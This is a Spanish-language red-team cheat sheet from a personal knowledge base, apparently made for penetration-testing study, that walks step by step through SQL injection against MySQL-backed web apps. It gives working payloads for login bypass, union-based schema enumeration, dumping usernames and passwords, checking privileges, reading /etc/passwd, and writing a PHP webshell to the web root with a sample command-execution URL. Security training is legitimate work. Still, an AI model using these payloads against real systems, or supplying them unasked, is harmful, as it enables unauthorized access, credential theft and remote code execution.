---
aliases:
tags:
  - type/cheatsheet
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación|Explotación]]"
tertiary categories:
  - "[[Explotación Web]]"
type: CheatSheet
linked:
  - "[[SQL Commands]]"
  - "[[SQLi Enumeration]]"
  - "[[MySQL Read & Write]]"
  - "[[SQLi to RCE]]"
  - "[[SQLi - Error based]]"
  - "[[SQLi  - Union based]]"
  - "[[SQLi - Boolean based]]"
  - "[[SQLi - Time based]]"
  - "[[SQLi - Out of Band]]"
  - "[[SQLi - Second order]]"
  - "[[SQLi - Routed]]"
  - "[[SQLi - Lateral]]"
---
# SQL Injection (SQLi)

***

## Cheatsheet

### In-Band SQLi

````tabs

tab: **Union-based**
![[SQLi  - Union based#^sqli-union]]

tab: **Error-based**
![[SQLi - Error based#^sqli-error]]
````

### Inferential Blind

````tabs
tab: **Boolean-based Blind**
![[SQLi - Boolean based#^sqli-boolean]]

tab: **Time-based Blind**
![[SQLi - Time based#^sqli-time]]
````

### Out-of-Band

````tabs
tab: **OOB**
![[SQLi - Out of Band#^sqli-out]]
````

### Técnicas Avanzadas y de Contexto Específico

````tabs
tab: **Second-order**
![[SQLi - Second order#^sqli-second]]

tab: **Routed**
![[SQLi - Routed#^sqli-routed]]

tab: **Lateral**
![[SQLi - Lateral#^sqli-lateral]]
````


___

## Paso a paso

### 1. Auth Bypass (Acceso Inicial)

_Payloads para saltarse formularios de login._
```SQL
admin' or '1'='1       -- Bypass básico
admin')-- -            -- Bypass con cierre de paréntesis y comentario
```

### 2. Reconocimiento y Estructura (Union-Based Setup)

_Determinar la cantidad de columnas para poder usar `UNION SELECT`._
```SQL
' order by 1-- -       -- Detectar columnas incrementando el número (1, 2, 3...)
cn' UNION select 1,2,3-- -  -- Validar inyección Union (si hay 3 columnas)
```

### 3. Enumeración de Base de Datos

_Una vez confirmada la inyección Union, extraer información del sistema._
```SQL
-- Versión y Fingerprinting
SELECT @@version       -- Versión de la DB (en output)
SELECT SLEEP(5)        -- Fingerprint basado en tiempo (Blind)

-- Base de datos actual
cn' UNION select 1,database(),2,3-- -
```

### 4. Enumeración de Esquema (Information_Schema)

_Mapeo completo de la base de datos._
```SQL
-- Listar TODAS las bases de datos
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -

-- Listar TABLAS de una base de datos específica ('dev')
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -

-- Listar COLUMNAS de una tabla específica ('credentials')
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -

-- Dumpear DATOS (Extraer usuarios y passwords)
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

### 5. Privilegios del Usuario

_¿Qué permisos tiene el usuario con el que corre la DB?_
```SQL
-- Usuario actual
cn' UNION SELECT 1, user(), 3, 4-- -

-- Verificar si es Super Admin (root)
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -

-- Listar todos los privilegios
cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -

-- Verificar permisos de archivos (importante para LFI/RCE)
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

### 6. SQLi to RCE (File I/O)

_Escalada crítica: Leer archivos del sistema o escribir webshells._

**LFI (Local File Inclusion / Lectura):**
```SQL
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

**File Write (Escritura de Archivos):**
```SQL
-- Prueba de escritura simple
select 'file written successfully!' into outfile '/var/www/html/proof.txt'

-- RCE: Escribir una Webshell PHP
cn' union select "",'<?=`$_GET[0]`?>', "", "" into outfile '/var/www/html/shell.php'-- -
# http://STMIP:STMPO/shell.php?0=cat%20../etc/passwd
```

***

## Overview



***

/etc/nginx//sites-enabled/default
 /etc/apache2/sites-enabled/000-default.conf
 
|**Payload (Carácter Especial)**|**Valor URL Encoded**|**Función Estructural en Inyecciones**|
|---|---|---|
|`'` (Comilla simple)|`%27`|Ruptura de cadenas de texto y escape de contexto principal.|
|`"` (Comilla doble)|`%22`|Ruptura de identificadores o strings alternativos (depende del SGBD).|
|`#` (Almohadilla)|`%23`|Operador de comentario en [[MySQL]]; trunca el resto de la consulta original.|
|`;` (Punto y coma)|`%3B`|Terminador de sentencias; crucial para habilitar inyecciones apiladas (Stacked Queries).|
|`)` (Paréntesis de cierre)|`%29`|Equilibrio de sintaxis; permite cerrar funciones o subconsultas previas al payload.|